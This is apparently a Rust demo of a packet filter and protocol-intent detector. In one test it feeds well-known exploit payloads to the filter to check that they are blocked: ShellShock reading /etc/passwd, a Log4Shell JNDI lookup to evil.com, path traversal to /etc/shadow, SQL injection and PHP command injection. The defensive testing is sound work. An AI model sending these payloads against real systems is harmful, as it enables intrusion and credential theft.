use std::time::Instant;

use tibet_trust_kernel::xdp::{XdpLiquidator, XdpConfig, XdpVerdict, build_test_packet};
use tibet_trust_kernel::portmux::{default_port_map, infer_intent};

/// PORTMUX + XDP DEMO — Packet-Level to Port-Level Trust
///
/// Two layers of defense:
///   1. XDP Liquidator: packet-level classification (eBPF in production)
///      - Deny lists, SYN flood protection, exploit signature scanning
///      - O(1) port lookup, nanosecond decisions
///
///   2. PortMux: port-level intent inference
///      - Protocol detection (SSH, HTTP, TLS, PostgreSQL, Redis, etc.)
///      - Automatic intent mapping for the Trust Kernel pipeline
///
/// Together: XDP drops bad packets -> PortMux wraps surviving traffic -> Trust Kernel

/// Helper: parse IPv4 string to [u8; 4]
fn ip(s: &str) -> [u8; 4] {
    let parts: Vec<u8> = s.split('.').map(|p| p.parse().unwrap_or(0)).collect();
    [parts[0], parts[1], parts[2], parts[3]]
}

/// Helper: parse IPv4 string to u32 (network order)
fn ip_u32(s: &str) -> u32 {
    let p = ip(s);
    u32::from_be_bytes(p)
}

fn main() {
    println!();
    println!("  ╔═══════════════════════════════════════════════════════════╗");
    println!("  ║  PORTMUX + XDP — Packet-Level Trust Hardening            ║");
    println!("  ║                                                          ║");
    println!("  ║  Layer 1: XDP Liquidator (packet classification)         ║");
    println!("  ║  Layer 2: PortMux (protocol detection + intent mapping)  ║");
    println!("  ║  Together: defense-in-depth at wire speed                ║");
    println!("  ╚═══════════════════════════════════════════════════════════╝");
    println!();

    // ═══════════════════════════════════════════════════════════════
    // PART A: XDP LIQUIDATOR
    // ═══════════════════════════════════════════════════════════════
    println!("  ════════════════════════════════════════════════════════");
    println!("  PART A: XDP LIQUIDATOR — Packet-Level Classification");
    println!("  ════════════════════════════════════════════════════════");
    println!();

    let xdp_config = XdpConfig {
        protected_ports: vec![22, 80, 443, 4430, 5432, 6379, 11434],
        syn_rate_limit: 100,
        require_intent_on_first_data: true,
        deny_list: vec![ip_u32("10.66.6.6"), ip_u32("192.168.100.100")],
        allow_list: vec![ip_u32("127.0.0.1")],
        check_exploit_signatures: true,
    };
    let xdp = XdpLiquidator::new(xdp_config);

    // ── Test 1: Valid SSH connection ──
    println!("  ── Test 1: Valid SSH Connection ──");
    {
        let pkt = build_test_packet(
            ip("192.168.4.10"), ip("192.168.4.85"),
            12345, 22,
            0x02, // SYN
            b"SSH-2.0-OpenSSH_9.2\r\n",
        );
        let (verdict, reason) = xdp.classify(&pkt);
        println!("  Packet:  192.168.4.10:12345 -> :22 (SSH SYN+data)");
        println!("  Verdict: {:?}  Reason: {:?}", verdict, reason);
    }
    println!();

    // ── Test 2: Valid HTTP request ──
    println!("  ── Test 2: Valid HTTP Request ──");
    {
        let pkt = build_test_packet(
            ip("192.168.4.20"), ip("192.168.4.85"),
            54321, 80,
            0x18, // PSH+ACK
            b"GET /api/health HTTP/1.1\r\nHost: p520.local\r\n\r\n",
        );
        let (verdict, reason) = xdp.classify(&pkt);
        println!("  Packet:  192.168.4.20:54321 -> :80 (HTTP GET)");
        println!("  Verdict: {:?}  Reason: {:?}", verdict, reason);
    }
    println!();

    // ── Test 3: Denied IP ──
    println!("  ── Test 3: Denied IP Address ──");
    {
        let pkt = build_test_packet(
            ip("10.66.6.6"), ip("192.168.4.85"),
            666, 443,
            0x02, // SYN
            b"",
        );
        let (verdict, reason) = xdp.classify(&pkt);
        println!("  Packet:  10.66.6.6:666 -> :443 (deny-listed)");
        println!("  Verdict: {:?}  Reason: {:?}", verdict, reason);
    }
    println!();

    // ── Test 4: Exploit signatures ──
    println!("  ── Test 4: Exploit Signature Detection ──");
    {
        let exploits: Vec<(&str, &[u8])> = vec![
            ("ShellShock", b"() { :;}; /bin/bash -c 'cat /etc/passwd'"),
            ("Log4Shell", b"${jndi:ldap://evil.com/exploit}"),
            ("Path Traversal", b"GET /../../../etc/shadow HTTP/1.1\r\n"),
            ("SQL Injection", b"' OR 1=1 --"),
            ("PHP Injection", b"<?php system('id'); ?>"),
        ];

        for (name, payload) in &exploits {
            let pkt = build_test_packet(
                ip("10.0.0.5"), ip("192.168.4.85"),
                40000, 80,
                0x18, // PSH+ACK
                payload,
            );
            let (verdict, _reason) = xdp.classify(&pkt);
            let blocked = matches!(verdict, XdpVerdict::Drop);
            println!("  {:<18} {:?}  {}", name, verdict,
                if blocked { "(BLOCKED)" } else { "(passed)" });
        }
    }
    println!();

    // ── Test 5: Unprotected port ──
    println!("  ── Test 5: Unprotected Port ──");
    {
        let pkt = build_test_packet(
            ip("192.168.4.30"), ip("192.168.4.85"),
            55555, 9999,  // not in protected list
            0x18,
            b"random data",
        );
        let (verdict, reason) = xdp.classify(&pkt);
        println!("  Packet:  -> :9999 (not protected)");
        println!("  Verdict: {:?}  Reason: {:?}", verdict, reason);
    }
    println!();

    // ── Test 6: Allowlisted IP bypass ──
    println!("  ── Test 6: Allowlist Bypass (localhost) ──");
    {
        let pkt = build_test_packet(
            ip("127.0.0.1"), ip("192.168.4.85"),
            4430, 4430,
            0x18,
            b"anything goes for localhost",
        );
        let (verdict, reason) = xdp.classify(&pkt);
        println!("  Packet:  127.0.0.1 -> :4430 (allowlisted)");
        println!("  Verdict: {:?}  Reason: {:?}", verdict, reason);
    }
    println!();

    // ── Test 7: XDP throughput ──
    println!("  ── Test 7: XDP Throughput ──");
    {
        let iterations = 100_000u32;
        let pkt = build_test_packet(
            ip("192.168.4.10"), ip("192.168.4.85"),
            12345, 22,
            0x18, // PSH+ACK (data)
            b"SSH-2.0-OpenSSH_9.2\r\n",
        );

        let t0 = Instant::now();
        let mut pass = 0u32;
        let mut drop = 0u32;
        for _ in 0..iterations {
            match xdp.classify(&pkt).0 {
                XdpVerdict::Pass => pass += 1,
                XdpVerdict::Drop => drop += 1,
                XdpVerdict::Tx => {}
            }
        }
        let elapsed_us = t0.elapsed().as_micros();
        let pps = iterations as f64 / (elapsed_us as f64 / 1_000_000.0);
        let ns_per_pkt = (elapsed_us * 1000) / iterations as u128;

        println!("  Packets:    {}", iterations);
        println!("  Pass/Drop:  {}/{}", pass, drop);
        println!("  Time:       {}us", elapsed_us);
        println!("  Throughput: {:.0} packets/sec ({} ns/pkt)", pps, ns_per_pkt);
    }
    println!();

    let stats = xdp.stats();
    println!("  XDP Stats:  total={} passed={} dropped={} (deny={}, exploit={}, noport={}, nointent={}, malformed={})",
        stats.packets_total, stats.packets_passed, stats.packets_dropped,
        stats.drops_deny_list, stats.drops_exploit, stats.drops_unprotected,
        stats.drops_no_intent, stats.drops_malformed);
    println!();

    // ═══════════════════════════════════════════════════════════════
    // PART B: PORTMUX — Protocol Detection + Intent Mapping
    // ═══════════════════════════════════════════════════════════════
    println!("  ════════════════════════════════════════════════════════");
    println!("  PART B: PORTMUX — Protocol Detection + Intent Mapping");
    println!("  ════════════════════════════════════════════════════════");
    println!();

    let port_map = default_port_map();

    // Show port mappings
    println!("  ── Port -> Intent Map ──");
    let mut ports: Vec<_> = port_map.iter().collect();
    ports.sort_by_key(|(p, _)| **p);
    for (port, intent) in &ports {
        println!("  {:>5} -> {:<30} ({:?})", port, intent.default_intent, intent.mode);
    }
    println!();

    // ── Protocol detection tests ──
    println!("  ── Protocol Detection ──");
    {
        let tls_hello = {
            let mut hello = vec![0x16, 0x03, 0x01, 0x00, 0x50]; // TLS record header
            hello.extend_from_slice(&[0x01, 0x00, 0x00, 0x4c]); // ClientHello
            hello.extend_from_slice(&[0x03, 0x03]); // TLS 1.2
            hello.extend_from_slice(&[0x00; 32]); // random
            hello
        };

        let pg_startup = {
            let mut startup = vec![0x00, 0x00, 0x00, 0x30]; // length
            startup.extend_from_slice(&[0x00, 0x03, 0x00, 0x00]); // protocol 3.0
            startup.extend_from_slice(b"user\x00admin\x00database\x00mydb\x00\x00");
            startup
        };

        let tests: Vec<(u16, &str, &[u8])> = vec![
            (22, "SSH", b"SSH-2.0-OpenSSH_9.2p1 Debian-2\r\n"),
            (80, "HTTP GET", b"GET /index.html HTTP/1.1\r\nHost: example.com\r\n\r\n"),
            (80, "HTTP POST", b"POST /api/data HTTP/1.1\r\nContent-Type: application/json\r\n"),
            (443, "TLS ClientHello", &tls_hello),
            (5432, "PostgreSQL", &pg_startup),
            (6379, "Redis", b"*3\r\n$3\r\nSET\r\n$5\r\nmykey\r\n$7\r\nmyvalue\r\n"),
            (11434, "Ollama", b"POST /api/generate HTTP/1.1\r\nHost: localhost:11434\r\n"),
            (80, "Unknown", b"\x00\x01\x02\x03random bytes"),
        ];

        println!("  {:<8} {:<18} {:<25} {:<10}", "Port", "Protocol", "Intent", "Confidence");
        println!("  {}", "-".repeat(65));

        for (port, label, first_bytes) in &tests {
            let inferred = infer_intent(*port, first_bytes, &port_map);
            println!("  {:<8} {:<18} {:<25} {:.2}",
                port, label, inferred.intent, inferred.confidence);
        }
    }
    println!();

    // ── PortMux throughput ──
    println!("  ── PortMux Throughput ──");
    {
        let iterations = 100_000u32;
        let ssh_bytes: &[u8] = b"SSH-2.0-OpenSSH_9.2\r\n";

        let t0 = Instant::now();
        for _ in 0..iterations {
            let _ = infer_intent(22, ssh_bytes, &port_map);
        }
        let elapsed_us = t0.elapsed().as_micros();
        let pps = iterations as f64 / (elapsed_us as f64 / 1_000_000.0);
        let ns_per = (elapsed_us * 1000) / iterations as u128;

        println!("  Inferences: {}", iterations);
        println!("  Time:       {}us", elapsed_us);
        println!("  Throughput: {:.0} infer/sec ({} ns/infer)", pps, ns_per);
    }
    println!();

    // ═══════════════════════════════════════════════════════════════
    // PART C: COMBINED — XDP + PortMux Pipeline
    // ═══════════════════════════════════════════════════════════════
    println!("  ════════════════════════════════════════════════════════");
    println!("  PART C: COMBINED PIPELINE — XDP -> PortMux -> Trust Kernel");
    println!("  ════════════════════════════════════════════════════════");
    println!();

    {
        let xdp_config = XdpConfig {
            protected_ports: vec![22, 80, 443, 4430, 5432, 6379, 11434],
            syn_rate_limit: 1000,
            require_intent_on_first_data: true,
            deny_list: vec![ip_u32("10.66.6.6")],
            allow_list: vec![],
            check_exploit_signatures: true,
        };
        let xdp = XdpLiquidator::new(xdp_config);
        let port_map = default_port_map();

        // Simulate mixed traffic
        let scenarios: Vec<(&str, [u8;4], [u8;4], u16, u16, u8, &[u8], &str)> = vec![
            ("Clean SSH",     ip("192.168.4.10"), ip("192.168.4.85"), 12345, 22,    0x18, b"SSH-2.0-OpenSSH_9.2\r\n" as &[u8], "should: PASS -> shell:ssh"),
            ("Clean HTTP",    ip("192.168.4.20"), ip("192.168.4.85"), 54321, 80,    0x18, b"GET / HTTP/1.1\r\n", "should: PASS -> http:get"),
            ("Ollama API",    ip("192.168.4.30"), ip("192.168.4.85"), 33333, 11434, 0x18, b"POST /api/generate HTTP/1.1\r\n", "should: PASS -> ai:ollama"),
            ("Redis CMD",     ip("192.168.4.40"), ip("192.168.4.85"), 44444, 6379,  0x18, b"*1\r\n$4\r\nPING\r\n", "should: PASS -> db:redis"),
            ("Denied IP",     ip("10.66.6.6"),    ip("192.168.4.85"), 666,   80,    0x18, b"GET / HTTP/1.1\r\n", "should: DROP"),
            ("Log4Shell",     ip("10.0.0.5"),     ip("192.168.4.85"), 40000, 80,    0x18, b"${jndi:ldap://evil/x}", "should: DROP (exploit)"),
            ("No intent",     ip("192.168.4.50"), ip("192.168.4.85"), 55555, 443,   0x18, b"\x00\x01\x02\x03", "should: DROP (no intent)"),
        ];

        println!("  {:<15} {:<12} {:<22} {}", "Scenario", "XDP", "PortMux Intent", "Expected");
        println!("  {}", "-".repeat(75));

        for (name, src, dst, sport, dport, flags, payload, expected) in &scenarios {
            let pkt = build_test_packet(*src, *dst, *sport, *dport, *flags, payload);
            let (verdict, reason) = xdp.classify(&pkt);

            let intent_str = if matches!(verdict, XdpVerdict::Pass) {
                let inferred = infer_intent(*dport, payload, &port_map);
                format!("{} ({:.0}%)", inferred.intent, inferred.confidence * 100.0)
            } else {
                format!("-- ({:?})", reason.unwrap_or(tibet_trust_kernel::xdp::DropReason::Malformed))
            };

            println!("  {:<15} {:<12} {:<22} {}",
                name, format!("{:?}", verdict), intent_str, expected);
        }

        println!();
        let combined_stats = xdp.stats();
        println!("  Combined: {} passed, {} dropped", combined_stats.packets_passed, combined_stats.packets_dropped);
    }
    println!();

    // ═══════════════════════════════════════════════════════════════
    // SUMMARY
    // ═══════════════════════════════════════════════════════════════
    println!("  ══════════════════════════════════════════════════════════════");
    println!("  PORTMUX + XDP HARDENING — RESULTS");
    println!("  ──────────────────────────────────────────────────────────────");
    println!("  XDP:      Packet-level filter (deny, exploit, rate, intent)");
    println!("  PortMux:  Protocol detection (SSH, HTTP, TLS, PG, Redis, ...)");
    println!("  Combined: Defense-in-depth at wire speed");
    println!();
    println!("  Protected ports: 22, 80, 443, 4430, 5432, 6379, 11434");
    println!("  Exploit sigs:    ShellShock, Log4Shell, SQLi, Path Traversal");
    println!("  Intent mapping:  Automatic per protocol detection");
    println!();
    println!("  Deploy: wrap any port -> Trust Kernel evaluates every connection");
    println!("  ══════════════════════════════════════════════════════════════");
    println!();
}
